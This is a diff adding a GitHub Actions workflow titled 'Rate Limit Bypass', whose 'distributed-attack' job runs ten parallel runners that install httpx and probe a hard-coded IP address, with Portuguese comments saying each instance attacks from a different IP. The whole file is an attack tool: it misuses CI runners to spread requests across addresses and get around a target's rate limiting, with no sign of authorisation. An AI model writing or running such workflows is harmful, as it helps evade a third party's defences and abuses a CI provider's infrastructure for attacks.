@@ -1,0 +1,22 @@
+name: Rate Limit Bypass
+on:
+  workflow_dispatch:
+
+jobs:
+  distributed-attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+      max-parallel: 10  # Executa 10 jobs simultâneos
+    steps:
+      - name: Install tools
+        run: |
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+      
+      - name: Distributed requests
+        run: |
+          echo "Runner ${{ matrix.instance }}"
+          # Cada instância ataca de um IP diferente
+          echo "54.160.153.58" | httpx -silent -mc 200,403
